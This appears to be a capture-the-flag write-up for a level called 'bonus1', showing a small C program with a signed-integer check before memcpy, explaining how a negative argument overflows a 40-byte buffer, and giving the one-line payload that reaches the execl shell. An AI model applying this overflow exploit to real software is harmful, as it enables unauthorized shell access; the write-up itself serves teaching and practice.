# Bonus1

## Code

```
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv)
{
  char dest[40];
  int pass;

  pass = atoi(argv[1]);
  if ( pass > 9 )
    return 1;

  memcpy(dest, argv[2], pass * 4);
  if ( pass == 1464814662 )
    execl("/bin/sh", "sh", 0);

  return 0;
}

```

## Explanation


- Here we have a program that calls atoi() on argv[1], checks if the
    value is under 9 and then memcpy() argv[2] on a buffer of 40 bytes
    on a length of the value of the previous atoi times 4.

- So of course the problem is that the number given as argv[1] can't
    be higher than 9, and if we want to satisfy the win condition, even
    the highest value (9), once multiplied by 4, will fill 36 bytes
    of the buffer, not making it overflow...

- The good news is that memcpy() casts its third argument as unsigned,
    so all we need is to give as argv[1] a particular negative value,
    that once multiplied by four and casted as unsigned,
    will allow us to memcpy() more than 40 bytes to fill the
    int with the needed value.

- We used the little program in ./resources to find such a value,
    and then all we had to do is send this value as argv1, and
    as argv2, 40 random bytes followed by the hexadecimal value
    of the desired value.

## Exploit

Here's our final payload :
```
$    ./bonus1 -1073741812 `python -c 'print("A" * 40 + "\x46\x4c\x4f\x57")'`
```